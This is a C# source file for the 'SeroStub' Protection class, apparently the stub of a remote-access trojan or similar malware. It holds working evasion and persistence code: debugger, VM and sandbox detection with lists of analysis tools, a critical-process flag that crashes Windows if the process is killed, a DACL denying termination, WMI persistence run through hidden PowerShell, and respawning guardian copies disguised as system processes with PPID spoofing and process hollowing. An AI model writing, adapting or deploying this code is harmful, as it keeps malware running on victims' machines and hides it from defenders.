using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SeroStub;

internal static partial class Protection
{
    // â"€â"€ P/Invoke â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool IsDebuggerPresent();

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool CheckRemoteDebuggerPresent(nint hProcess, [MarshalAs(UnmanagedType.Bool)] out bool isDebuggerPresent);

    [LibraryImport("ntdll.dll")]
    private static partial int NtQueryInformationProcess(nint hProcess, int processInfoClass, out nint info, int size, out int returnLength);

    [LibraryImport("ntdll.dll")]
    private static partial int NtSetInformationThread(nint hThread, int threadInfoClass, ref int info, int length);

    [LibraryImport("kernel32.dll")]
    private static partial nint GetCurrentThread();

    [LibraryImport("kernel32.dll")]
    private static partial nint GetCurrentProcess();

    [LibraryImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool GetCursorPos(out POINT lpPoint);

    [StructLayout(LayoutKind.Sequential)]
    private struct POINT { public int X; public int Y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    [LibraryImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    // â"€â"€ Anti-Debug â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

    public static bool IsDebuggerDetected()
    {
        if (Debugger.IsAttached) return true;
        if (IsDebuggerPresent()) return true;
        if (CheckRemoteDebuggerPresent(GetCurrentProcess(), out bool remote) && remote) return true;

        // NtQueryInformationProcess - DebugPort (0x7)
        if (NtQueryInformationProcess(GetCurrentProcess(), 0x7, out nint debugPort, nint.Size, out _) == 0 && debugPort != 0)
            return true;

        // Timing check â€" use a higher threshold to avoid false positives on loaded systems
        long t1 = Environment.TickCount64;
        Thread.SpinWait(1000);
        long t2 = Environment.TickCount64;
        if (t2 - t1 > 500) return true;

        return false;
    }

    public static void HideFromDebugger()
    {
        int zero = 0;
        NtSetInformationThread(GetCurrentThread(), 0x11, ref zero, 0);
    }

    // â"€â"€ Anti-Kill (Critical Process â†' BSOD on terminate) â"€â"€

    [LibraryImport("ntdll.dll")]
    private static partial int NtSetInformationProcess(nint hProcess, int processInfoClass, ref int processInfo, int length);

    // P/Invoke for DACL protection
    [LibraryImport("advapi32.dll", SetLastError = true)]
    private static partial int SetSecurityInfo(
        nint handle, int objectType, uint securityInfo,
        nint psidOwner, nint psidGroup, nint pDacl, nint pSacl);

    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool InitializeAcl(nint pAcl, int nAclLength, int dwAclRevision);

    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool AddAccessDeniedAce(nint pAcl, int dwAceRevision, uint AccessMask, nint pSid);

    [LibraryImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool AddAccessAllowedAce(nint pAcl, int dwAceRevision, uint AccessMask, nint pSid);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AllocateAndInitializeSid(
        byte[] pIdentifierAuthority,
        byte nSubAuthorityCount,
        uint nSubAuthority0, uint nSubAuthority1, uint nSubAuthority2, uint nSubAuthority3,
        uint nSubAuthority4, uint nSubAuthority5, uint nSubAuthority6, uint nSubAuthority7,
        out nint pSid);

    [DllImport("advapi32.dll")]
    private static extern nint FreeSid(nint pSid);
    // Source - https://stackoverflow.com/q/50996439
    // Posted by JustHobby, modified by community. See post 'Timeline' for change history
    // Retrieved 2026-03-30, License - CC BY-SA 4.0




    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege
  (
      int Privilege,
      bool bEnablePrivilege,
      bool IsThreadPrivilege,
      out bool PreviousValue
  );

    public static void EnablePrivilege(int privilegeId)
    {
        bool wasEnabled;
        uint status = RtlAdjustPrivilege(privilegeId, true, false, out wasEnabled);
        if (status != 0)
        {
            StubLog.Error($"[AntiKill] RtlAdjustPrivilege({privilegeId}) failed: 0x{status:X}");
        }
    }


    public static void SetCriticalProcess()
    {
        try
        {
            EnablePrivilege(20);
            EnablePrivilege(6);
            EnablePrivilege(19);
            int isCritical = 1;
            // ProcessBreakOnTermination = 29

            int status = NtSetInformationProcess(GetCurrentProcess(), 29, ref isCritical, sizeof(int));
            StubLog.Info(status == 0 ? "[AntiKill] Process set as critical (BSOD on kill)." : $"[AntiKill] NtSetInformationProcess failed: 0x{status:X}");
        }
        catch (Exception ex) { StubLog.Error($"[AntiKill] Failed: {ex.Message}"); }
    }

    public static void UnsetCriticalProcess()
    {
        try
        {
            EnablePrivilege(20);
            EnablePrivilege(6);
            EnablePrivilege(19);
            int isCritical = 0;
            // ProcessBreakOnTermination = 29

            int status = NtSetInformationProcess(GetCurrentProcess(), 29, ref isCritical, sizeof(int));
            StubLog.Info(status == 0 ? "[AntiKill] Process unmarked as critical." : $"[AntiKill] UnsetCriticalProcess failed: 0x{status:X}");
        }
        catch (Exception ex) { StubLog.Error($"[AntiKill] Unset failed: {ex.Message}"); }
    }
    /// <summary>
    /// User-mode anti-kill: sets a DENY ACE on PROCESS_TERMINATE only.
    /// This blocks TerminateProcess() from outside while still allowing
    /// SYNCHRONIZE access so the guardian can call WaitForExit().
    /// Works in both SingleFile and RunPE (hollowed process) modes.
    /// </summary>
    public static void ProtectProcessDacl()
    {
        // Build a DACL with two ACEs for Everyone (S-1-1-0):
        //   1. DENY  PROCESS_TERMINATE           — blocks TerminateProcess()
        //   2. ALLOW PROCESS_ALL_ACCESS except TERMINATE — lets guardian WaitForExit/HasExited work
        // DENY ACEs are evaluated first, so terminate is always blocked even though ALLOW covers other rights.
        const uint PROCESS_TERMINATE            = 0x0001;
        const uint PROCESS_ALL_EXCEPT_TERMINATE = 0x001FFFFE; // PROCESS_ALL_ACCESS(0x1FFFFF) & ~TERMINATE
        const int  ACL_REVISION = 2;
        const uint DACL_SI = 4 | 0x80000000u; // DACL_SECURITY_INFORMATION | PROTECTED_DACL

        nint everyoneSid = 0;
        nint pAcl = 0;
        try
        {
            byte[] worldAuth = [0, 0, 0, 0, 0, 1]; // SECURITY_WORLD_SID_AUTHORITY
            if (!AllocateAndInitializeSid(worldAuth, 1, 0, 0, 0, 0, 0, 0, 0, 0, out everyoneSid)
                || everyoneSid == 0) return;

            // SID size for S-1-1-0 = 12 bytes. Each ACE = ACE_HEADER(4) + Mask(4) + SID(12) = 20 bytes.
            // ACL = header(8) + DENY ACE(20) + ALLOW ACE(20) = 48 bytes
            int aclSize = 8 + 20 + 20;
            pAcl = Marshal.AllocHGlobal(aclSize);
            if (!InitializeAcl(pAcl, aclSize, ACL_REVISION)) return;

            AddAccessDeniedAce(pAcl, ACL_REVISION, PROCESS_TERMINATE, everyoneSid);
            AddAccessAllowedAce(pAcl, ACL_REVISION, PROCESS_ALL_EXCEPT_TERMINATE, everyoneSid);

            SetSecurityInfo(GetCurrentProcess(), 6, DACL_SI, 0, 0, pAcl, 0);
            StubLog.Info("[DACL] PROCESS_TERMINATE denied; all other access allowed.");
        }
        catch (Exception ex) { StubLog.Error($"[DACL] Failed: {ex.Message}"); }
        finally
        {
            if (everyoneSid != 0) FreeSid(everyoneSid);
            if (pAcl != 0) Marshal.FreeHGlobal(pAcl);
        }
    }

    /// <summary>Removes the DACL protection (sets null DACL = full access) before uninstall/exit.</summary>
    public static void RemoveDacl()
    {
        try
        {
            // NULL DACL = unrestricted access (needed so the process can exit cleanly)
            const uint DACL_SI = 4 | 0x80000000u;
            SetSecurityInfo(GetCurrentProcess(), 6, DACL_SI, 0, 0, 0, 0);
        }
        catch { }
    }

    // ── WMI Permanent Event Subscription ─────────────────────────────────────
    // Registers a WMI subscription in root\subscription that fires when our process
    // terminates and relaunches the exe automatically — survives even if all guardians
    // are killed simultaneously. Runs from the WMI service (winmgmt), independent of us.

    public static void RegisterWmiPersistence(string exePath)
    {
        try
        {
            var exeName = Path.GetFileName(exePath);
            var filterName  = Config.PersistName + "WF";
            var consumerName = Config.PersistName + "EC";
            var escapedExe  = exePath.Replace("'", "''").Replace("\\", "\\\\");

            // Use PowerShell Set-WmiInstance (no NuGet needed) — runs entirely in WMI service
            var ps = $@"
$ErrorActionPreference='SilentlyContinue'
$ns='root/subscription'
$fn='{filterName}'
$cn='{consumerName}'
Get-WmiObject -Namespace $ns -Class __EventFilter          -Filter ""Name='$fn'"" | Remove-WmiObject
Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter ""Name='$cn'"" | Remove-WmiObject
Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$_.Filter -like ""*$fn*""}} | Remove-WmiObject
$f=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{{
    Name='$fn'
    QueryLanguage='WQL'
    Query=""SELECT * FROM __InstanceDeletionEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='{exeName}'""
    EventNamespace='root\cimv2'
}}
$c=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{{
    Name='$cn'
    CommandLineTemplate='{escapedExe}'
    RunInteractively=[bool]$false
}}
Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{{Filter=$f;Consumer=$c}}
";
            var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoP -W Hidden -NonInteractive -ExecutionPolicy Bypass -Command \"{ps.Replace("\"", "\\\"")}\"",
                CreateNoWindow = true,
                UseShellExecute = false,
            });
            proc?.WaitForExit(20000);
            StubLog.Info("[WMI] Permanent event subscription registered.");
        }
        catch (Exception ex) { StubLog.Error($"[WMI] Registration failed: {ex.Message}"); }
    }

    public static void UnregisterWmiPersistence()
    {
        try
        {
            var filterName   = Config.PersistName + "WF";
            var consumerName = Config.PersistName + "EC";
            var ps = $@"
$ns='root/subscription'
Get-WmiObject -Namespace $ns -Class __EventFilter          -Filter ""Name='{filterName}'"" | Remove-WmiObject
Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter ""Name='{consumerName}'"" | Remove-WmiObject
Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$_.Filter -like ""*{filterName}*""}} | Remove-WmiObject
";
            Process.Start(new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoP -W Hidden -NonInteractive -ExecutionPolicy Bypass -Command \"{ps.Replace("\"", "\\\"")}\"",
                CreateNoWindow = true,
                UseShellExecute = false,
            })?.WaitForExit(10000);
            StubLog.Info("[WMI] Permanent subscription removed.");
        }
        catch (Exception ex) { StubLog.Error($"[WMI] Unregister failed: {ex.Message}"); }
    }

    // ── Anti-Kill Watchdog (usermode guardian process) ──

    private static volatile bool _guardianRunning;
    private static volatile int _guardianPid1 = -1;
    private static volatile int _guardianPid2 = -1;
    private static volatile int _guardianPid3 = -1;
    private static volatile int _guardianPid4 = -1;

    private static string StopFlagPath => Path.Combine(
        Path.GetTempPath(), "SERO_STOP_" + Config.PersistName + ".flag");

    public static void ClearStopFlag()
    {
        try { if (File.Exists(StopFlagPath)) File.Delete(StopFlagPath); } catch { }
    }

    public static void StopGuardian()
    {
        _guardianRunning = false;

        // Write a flag file BEFORE killing guardians. Unlike a named kernel object,
        // a file persists after this process dies, so guardians that wake up later
        // will still see the signal and not relaunch.
        try { File.WriteAllText(StopFlagPath, Environment.ProcessId.ToString()); } catch { }

        Thread.Sleep(650);

        var toWait = new List<Process>();
        foreach (int pid in new[] { _guardianPid1, _guardianPid2, _guardianPid3, _guardianPid4 })
        {
            if (pid <= 0) continue;
            try
            {
                var p = Process.GetProcessById(pid);
                p.Kill();
                toWait.Add(p);
            }
            catch { }
        }
        foreach (var p in toWait)
        {
            try { p.WaitForExit(2000); } catch { }
            try { p.Dispose(); } catch { }
        }

        _guardianPid1 = _guardianPid2 = _guardianPid3 = _guardianPid4 = -1;
    }

    public static void StartAntiKillWatchdog()
    {
        if (_guardianRunning) return;
        _guardianRunning = true;

        // Store our PID so guardians can check if we're still alive before relaunching
        Environment.SetEnvironmentVariable("SERO_MAIN_PID", Environment.ProcessId.ToString());

        // Start guardian thread
        var thread = new Thread(GuardianLoop)
        {
            IsBackground = true,
            Priority = ThreadPriority.Highest
        };
        thread.Start();

        StubLog.Info("[Watchdog] Guardian started (DACL + process respawn)");
    }

    private static void GuardianLoop()
    {
        var selfPid = Environment.ProcessId;

        while (_guardianRunning)
        {
            try
            {
                var exePath = Persistence.GetInstalledPath(Config.PersistName)
                    ?? Environment.GetEnvironmentVariable("SERO_EXE")
                    ?? Environment.ProcessPath;
                if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
                {
                    Thread.Sleep(2000);
                    continue;
                }

                        // Staggered spawn: each guardian starts with a delay to avoid all 4 appearing
                // simultaneously in process monitors (would look suspicious as a group).
                int p1 = _guardianPid1; SpawnGuardianIfDead(ref p1, selfPid, exePath, 1); _guardianPid1 = p1;
                Thread.Sleep(800);
                int p2 = _guardianPid2; SpawnGuardianIfDead(ref p2, selfPid, exePath, 2); _guardianPid2 = p2;
                Thread.Sleep(800);
                int p3 = _guardianPid3; SpawnGuardianIfDead(ref p3, selfPid, exePath, 3); _guardianPid3 = p3;
                Thread.Sleep(800);
                int p4 = _guardianPid4; SpawnGuardianIfDead(ref p4, selfPid, exePath, 4); _guardianPid4 = p4;
            }
            catch (Exception ex)
            {
                StubLog.Error($"[AntiKill] Guardian loop error: {ex.Message}");
            }

            Thread.Sleep(500); // check every 500ms — smaller kill window
        }
    }

    // 4 diverse legitimate-looking targets for hollowed guardians (RunPE mode).
    // Different process names make them harder to spot as a group and kill simultaneously.
    private static readonly string[] _guardianTargets =
    [
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "dllhost.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "RuntimeBroker.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "SearchProtocolHost.exe"),
    ];

    // Guardian disguise names — intentionally NOT dllhost/RuntimeBroker to avoid appearing
    // alongside common payload targets when searched in Process Hacker.
    private static readonly string[] _singleFileGuardianNames =
    [
        "SearchProtocolHost.exe",
        "SearchFilterHost.exe",
        "taskhostw.exe",
        "sihost.exe",
    ];

    private static readonly string _guardianDisguiseDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Microsoft", "CoreRuntime");

    private static readonly string?[] _singleFilePaths = new string?[4];

    /// <summary>
    /// Prepares a disguised copy of the stub exe with a system-sounding name for the given slot.
    /// Creates the dir hidden+system, copies exe, marks it hidden+system too.
    /// Returns the disguise path, or null on failure.
    /// </summary>
    private static string? PrepareGuardianCopy(int slot, string realExePath)
    {
        try
        {
            Directory.CreateDirectory(_guardianDisguiseDir);
            File.SetAttributes(_guardianDisguiseDir,
                FileAttributes.Hidden | FileAttributes.System);

            var dst = Path.Combine(_guardianDisguiseDir,
                _singleFileGuardianNames[(slot - 1) % _singleFileGuardianNames.Length]);

            // Only copy if missing or outdated
            if (!File.Exists(dst) ||
                new FileInfo(dst).LastWriteTimeUtc < new FileInfo(realExePath).LastWriteTimeUtc)
            {
                File.Copy(realExePath, dst, overwrite: true);
                File.SetAttributes(dst, FileAttributes.Hidden | FileAttributes.System);
            }

            _singleFilePaths[slot - 1] = dst;
            return dst;
        }
        catch (Exception ex)
        {
            StubLog.Error($"[Guardian] Copy slot {slot} failed: {ex.Message}");
            return null;
        }
    }

    /// <summary>Removes all disguised guardian copies (called on uninstall).</summary>
    public static void CleanupGuardianCopies()
    {
        try
        {
            if (Directory.Exists(_guardianDisguiseDir))
                Directory.Delete(_guardianDisguiseDir, recursive: true);
        }
        catch { }
    }

    private static void SpawnGuardianIfDead(ref int pidField, int selfPid, string exePath, int slot)
    {
        // Don't spawn new guardians if we're shutting down — prevents respawn
        // race during StopGuardian() where the GuardianLoop kills G1 and
        // immediately respawns it with a new PID that StopGuardian() doesn't know about.
        if (!_guardianRunning) return;

        bool alive = false;
        if (pidField > 0)
        {
            try { using var p = Process.GetProcessById(pidField); alive = !p.HasExited; }
            catch { alive = false; }
        }
        if (alive) return;

        int newPid = -1;

        // Guardians always use SpawnDetached (never Hollow) so that SERO_GUARDIAN is
        // reliably passed via explicit env dict. Hollowing guardians caused a race condition
        // where SERO_GUARDIAN was cleared from the parent env before the child inherited it,
        // causing guardians to connect to the server as normal clients.
        // The disguised process name + PPID spoof is sufficient stealth.
        var disguisedPath = PrepareGuardianCopy(slot, exePath) ?? exePath;

        newPid = ProcessHollowing.SpawnDetached(disguisedPath, new Dictionary<string, string?>
        {
            ["SERO_GUARDIAN"]                   = selfPid.ToString(),
            ["SERO_MAIN_PID"]                   = selfPid.ToString(),
            [ProcessHollowing.HOLLOW_ENV_KEY]    = null,
            ["SERO_EXE"]                         = exePath,
            ["SERO_GUARDIAN_SELF"]               = disguisedPath,
        });

        pidField = newPid;
        if (newPid > 0)
            StubLog.Info($"[AntiKill] Guardian{slot} PID={newPid} (hollow={Config.EnableHollowing})");
    }

    /// <summary>
    /// Hollows our exe into a legitimate target process so the guardian appears
    /// as that process (e.g. dllhost.exe) with Explorer as parent — invisible in process tree.
    /// </summary>
    private static int SpawnHollowedGuardian(string exePath, string hollowTarget, int selfPid)
    {
        // Temporarily inject SERO_GUARDIAN into our env so the hollowed child inherits it.
        // SERO_MAIN_PID and SERO_EXE are already correctly set in our env.
        Environment.SetEnvironmentVariable("SERO_GUARDIAN", selfPid.ToString());
        try
        {
            // Hollow our PE into the target. PPID-spoofed to Explorer (skipPpidSpoof=false).
            // Returns the PID of the hollowed target process, or -1 on failure.
            return ProcessHollowing.Hollow(exePath, hollowTarget, skipPpidSpoof: false);
        }
        finally
        {
            // Clear immediately — child already inherited a snapshot of our env at CreateProcess time
            Environment.SetEnvironmentVariable("SERO_GUARDIAN", null);
        }
    }

    /// <summary>
    /// Called at startup to check if we're running as a guardian process.
    /// If so, monitor the parent and relaunch it if killed, then exit.
    /// Returns true if this instance is a guardian (caller should not continue normal flow).
    /// </summary>
    public static bool RunAsGuardianIfNeeded()
    {
        var guardianEnv = Environment.GetEnvironmentVariable("SERO_GUARDIAN");
        if (string.IsNullOrEmpty(guardianEnv) || !int.TryParse(guardianEnv, out int parentPid))
            return false;

        // We are a guardian -- monitor the parent
        StubLog.Info($"[Guardian] Monitoring parent PID={parentPid}");

        // In SingleFile mode, guardian copies are plain .NET executables — protect
        // this process with DACL so it can't be killed by TerminateProcess().
        // In RunPE mode the guardian is already inside a legitimate system process
        // so applying DACL here is harmless (same protection, different host).
        if (Config.EnableWatchdog)
            ProtectProcessDacl();

        // Clear SERO_GUARDIAN from our own environment so that when we
        // relaunch the main process, it does NOT inherit this variable and
        // doesn't accidentally become another guardian.
        Environment.SetEnvironmentVariable("SERO_GUARDIAN", null);

        // Wait for parent to die — two methods:
        // 1. WaitForExit() is ideal but requires SYNCHRONIZE access (may fail with aggressive DACL)
        // 2. Polling by PID fallback — always works regardless of DACL
        WaitForProcessDeath(parentPid);
        StubLog.Info("[Guardian] Parent died, relaunching...");
        RelaunchMain();

        return true;
    }

    /// <summary>
    /// Waits until the process with the given PID exits.
    /// Tries WaitForExit() first (efficient), falls back to 1-second PID polling
    /// if the DACL on the target process blocks SYNCHRONIZE access.
    /// </summary>
    private static void WaitForProcessDeath(int pid)
    {
        // Try WaitForExit (requires SYNCHRONIZE — works with our targeted DENY DACL)
        try
        {
            using var proc = Process.GetProcessById(pid);
            proc.WaitForExit();
            return;
        }
        catch (ArgumentException)
        {
            return; // Already dead
        }
        catch
        {
            // DACL blocked WaitForExit — fall through to polling
            StubLog.Info("[Guardian] WaitForExit blocked by DACL, switching to polling...");
        }

        // Fallback: poll every second until PID disappears
        // Record start time of the target process to detect PID reuse
        DateTime? targetStartTime = null;
        try
        {
            using var p0 = Process.GetProcessById(pid);
            try { targetStartTime = p0.StartTime; } catch { }
        }
        catch { }

        while (true)
        {
            try
            {
                using var proc = Process.GetProcessById(pid);
                // PID reuse check: if StartTime differs, original process is dead
                if (targetStartTime.HasValue)
                {
                    try
                    {
                        if (proc.StartTime != targetStartTime.Value) return;
                    }
                    catch { return; } // Can't read StartTime → process gone or replaced
                }
                try { if (proc.HasExited) return; } catch { }
            }
            catch (ArgumentException)
            {
                return; // PID no longer exists
            }
            catch { }

            Thread.Sleep(1000);
        }
    }

    private static void RelaunchMain()
    {
        // Check flag file — if present, main exited intentionally (uninstall/update).
        try
        {
            if (File.Exists(StopFlagPath))
            {
                StubLog.Info("[Guardian] Stop flag present, NOT relaunching.");
                return;
            }
        }
        catch { }

        // If main is still alive (e.g. this guardian was killed independently),
        // don't relaunch — GuardianLoop in the main process will respawn us.
        var mainPidStr = Environment.GetEnvironmentVariable("SERO_MAIN_PID");
        if (int.TryParse(mainPidStr, out int mainPid) && mainPid > 0)
        {
            try
            {
                using var p = Process.GetProcessById(mainPid);
                if (!p.HasExited)
                {
                    StubLog.Info("[Guardian] Main still alive, skipping relaunch.");
                    return;
                }
            }
            catch (ArgumentException) { } // dead — proceed
            catch { }
        }

        // Mutex arbitration: when two guardians detect main death simultaneously,
        // only the first to acquire the mutex actually relaunches.
        using var mutex = new Mutex(false, "Global\\" + Config.PersistName + "_RL");
        bool got = false;
        try { got = mutex.WaitOne(0); } catch { }
        if (!got)
        {
            StubLog.Info("[Guardian] Another guardian is already relaunching, skipping.");
            return;
        }

        try
        {
            var exePath = Persistence.GetInstalledPath(Config.PersistName)
                ?? Environment.GetEnvironmentVariable("SERO_EXE")
                ?? Environment.ProcessPath;

            if (string.IsNullOrEmpty(exePath) || !File.Exists(exePath))
            {
                StubLog.Error("[Guardian] Could not find exe to relaunch.");
                return;
            }

            // Use SpawnDetached so the relaunched main is PPID-spoofed to Explorer —
            // it won't appear as a child of this guardian in the process tree.
            int pid = ProcessHollowing.SpawnDetached(exePath, new Dictionary<string, string?>
            {
                ["SERO_GUARDIAN"]         = null,
                [ProcessHollowing.HOLLOW_ENV_KEY] = null,
                ["SERO_EXE"]              = exePath,
            });

            if (pid > 0)
                StubLog.Info($"[Guardian] Main relaunched PID={pid} from {exePath}");
            else
                StubLog.Error("[Guardian] SpawnDetached failed for relaunch.");
        }
        finally
        {
            try { mutex.ReleaseMutex(); } catch { }
        }
    }

    // â"€â"€ Anti-VM â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

    public static bool IsVirtualMachine()
    {
        try
        {
            // Check BIOS registry for VM indicators
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS"))
            {
                if (key != null)
                {
                    var biosVersion = key.GetValue("BIOSVersion")?.ToString();
                    var systemManufacturer = key.GetValue("SystemManufacturer")?.ToString();
                    var systemProductName = key.GetValue("SystemProductName")?.ToString();

                    if (biosVersion != null && (biosVersion.Contains("VMware") || biosVersion.Contains("VirtualBox") || biosVersion.Contains("VBOX")))
                        return true;
                    if (systemManufacturer != null && (systemManufacturer.Contains("VMware") || systemManufacturer.Contains("innotek")))
                        return true;
                    if (systemProductName != null && (systemProductName.Contains("VMware") || systemProductName.Contains("VirtualBox")))
                        return true;
                }
            }

            // Check for VMware tools registry
            using (var vmwareKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\VMware, Inc.\VMware Tools"))
            {
                if (vmwareKey != null)
                    return true;
            }

            // Check for VirtualBox registry
            using (var vboxKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Oracle\VirtualBox Guest Additions"))
            {
                if (vboxKey != null)
                    return true;
            }
        }
        catch { }

        return false;
    }
    // â"€â"€ Anti-Detect (sandbox/analysis) â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

    // High-confidence: actual debuggers/reversing tools — 3 points each
    private static readonly string[] DebuggerProcesses = [
        "ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "idaq", "idaq64",
        "windbg", "dnspy", "dotpeek", "pestudio", "die", "lordpe", "pe-bear",
        "resourcehacker"
    ];

    // Medium-confidence: monitoring/network tools — 1 point each
    private static readonly string[] MonitoringProcesses = [
        "processhacker", "procmon", "procexp",
        "wireshark", "fiddler", "charles", "tcpview",
        "sandboxie", "cuckoo", "regmon", "filemon",
        "autoruns", "tcpdump", "dumpcap", "httpdebugger"
    ];

    private static readonly string[] SuspiciousUsers = [
        "sandbox", "virus", "malware", "sample",
        "currentuser", "analyst", "tequilaboomboom",
        "sand box", "maltest", "plmsqjvtest"
    ];

    public static bool IsAnalysisEnvironment()
    {
        int score = 0;

        // Check running processes with weighted scoring
        try
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    var name = p.ProcessName.ToLowerInvariant();
                    foreach (var b in DebuggerProcesses)
                    {
                        if (name.Contains(b))
                        {
                            score += 3;
                            StubLog.Info($"[AntiDetect] Debugger detected: {name} (+3, total={score})");
                            break;
                        }
                    }
                    foreach (var b in MonitoringProcesses)
                    {
                        if (name.Contains(b))
                        {
                            score += 1;
                            StubLog.Info($"[AntiDetect] Monitor detected: {name} (+1, total={score})");
                            break;
                        }
                    }
                }
                catch { }
                finally { p.Dispose(); }
            }
        }
        catch { }

        // Suspicious username — 2 points
        var user = Environment.UserName.ToLowerInvariant();
        foreach (var u in SuspiciousUsers)
        {
            if (user.Contains(u))
            {
                score += 2;
                StubLog.Info($"[AntiDetect] Suspicious user: {user} (+2, total={score})");
                break;
            }
        }

        if (score >= 3)
            StubLog.Info($"[AntiDetect] BLOCKED — score={score} (threshold=3)");

        return score >= 3;
    }

    // â"€â"€ Anti-Sandbox (VirusTotal / Triage / Any.Run) â"€

    public static bool IsSandbox()
    {
        // Use a scoring system: need at least 3 indicators to flag as sandbox
        int score = 0;

        // Uptime check: sandboxes restart VMs frequently
        if (Environment.TickCount64 < 3 * 60 * 1000) score++; // < 3 minutes

        // Sleep-skip detection: sandbox fast-forwards sleeps
        var sw = Stopwatch.StartNew();
        Thread.Sleep(500);
        sw.Stop();
        if (sw.ElapsedMilliseconds < 400) score += 2; // strong indicator

        // Temp files count: real machines have many temp files
        try
        {
            var tempDir = Path.GetTempPath();
            if (Directory.Exists(tempDir))
            {
                if (Directory.GetFiles(tempDir).Length < 3) score++;
            }
        }
        catch { }

        // Installed programs count
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
            if (key != null)
            {
                if (key.GetSubKeyNames().Length < 8) score++;
            }
        }
        catch { }

        // RAM check: sandboxes typically have very little RAM
        try
        {
            var memStatus = new MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>() };
            if (GlobalMemoryStatusEx(ref memStatus))
            {
                if (memStatus.ullTotalPhys < 1UL * 1024 * 1024 * 1024) score++; // < 1 GB
            }
        }
        catch { }

        return score >= 3;
    }
}

